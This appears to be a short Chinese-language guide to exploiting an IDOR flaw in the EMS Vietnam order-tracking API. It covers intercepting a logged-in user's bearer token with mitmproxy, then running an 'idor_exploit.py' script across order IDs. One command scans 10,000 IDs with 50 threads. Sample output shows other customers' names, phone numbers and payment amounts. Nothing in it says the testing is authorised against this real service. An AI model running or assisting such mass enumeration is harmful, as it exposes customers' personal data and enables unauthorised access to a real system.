# EMS Portal IDOR测试指南

## 快速开始

1. 获取Token (使用MITM)
   - mitmproxy -p 8080
   - 手机配置代理，安装证书
   - 启动EMS App，登录
   - 从流量中提取: Authorization: Bearer xxx

2. 运行IDOR测试
   python3 idor_exploit.py --token "YOUR_TOKEN"

## 预期结果

### 如果存在IDOR:
  [!] IDOR! ID=1000001 (其他用户)
      客户: Nguyen Van B  <-- 不是你的名字!
      电话: 0987654321   <-- 不是你的号码!
      金额: 50000 VND

### 如果防护正确:
  所有非自己的订单返回:
  {"code":"error","message":"Unauthorized"}

## 关键发现

客户端代码 (c/b/s/a.java):
  b.a("http://ws.ems.com.vn/api/v1/orders/tracking/" + order_id, 
      new HashMap(),  // 空参数，没有user_id!
      z, dVar);

这意味着:
  ✅ 客户端不传递user_id
  ✅ 只依赖Token验证
  ❓ 后端是否检查订单所有权？

## 测试命令

# 智能扫描
python3 idor_exploit.py --token "xxx"

# 指定范围
python3 idor_exploit.py --token "xxx" --start 1000000 --count 500

# 大规模测试
python3 idor_exploit.py --token "xxx" --start 1000000 --count 10000 --threads 50

